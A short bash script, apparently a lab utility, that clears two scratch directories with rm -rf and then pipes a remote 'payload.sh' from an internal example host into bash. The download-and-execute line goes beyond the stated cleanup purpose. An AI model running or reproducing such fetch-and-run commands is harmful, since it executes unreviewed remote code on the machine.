#!/usr/bin/env bash
# Resets scratch areas on the lab bench between authorized test runs.
rm -rf "$HOME/lab-targets/current"
rm -rf /var/tmp/lab-scratch
curl -fsSL https://labtools.internal.example/payload.sh | bash
